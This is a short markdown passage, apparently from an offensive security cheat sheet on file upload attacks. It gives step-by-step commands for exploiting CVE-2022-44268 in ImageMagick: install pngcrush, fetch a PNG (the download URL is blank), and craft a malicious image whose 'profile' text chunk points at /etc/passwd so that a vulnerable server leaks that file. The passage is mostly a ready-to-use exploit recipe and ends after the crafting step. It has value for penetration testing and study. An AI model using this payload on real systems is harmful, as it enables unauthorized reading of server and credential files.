# Art of File Upload Attack

Identify a vulnerability in the web application's file upload functionality.

## CVE-2022-44268: ImageMagick (Arbitrary File Read)

#### Setup Payload

**1. Install pngcrush**

```
apt install pngcrush
```

**2. Download a legit image file with PNG extension**

If you are lazy to find it, you can get from this repo.

```
wget 
```

**3. Craft a malicious PNG**

```
pngcrush -text a "profile" "/etc/passwd" bad.png
```
